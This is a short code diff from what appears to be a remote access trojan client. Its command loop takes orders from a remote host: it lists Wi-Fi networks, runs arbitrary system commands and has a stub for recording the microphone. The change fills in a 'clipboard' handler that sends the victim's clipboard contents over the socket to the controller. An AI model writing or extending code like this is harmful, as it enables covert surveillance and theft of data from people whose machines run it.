@@ -47,7 +47,7 @@ def run(host, port):
             elif command == "wifi_lst":
                 get_wifi_list(client_socket)
             elif command == "clipboard":
-                pass
+                send_clipboard(client_socket)
             elif command[:21] == "mic_record --duration":
                 pass
             else:  # * Run Other System Commands
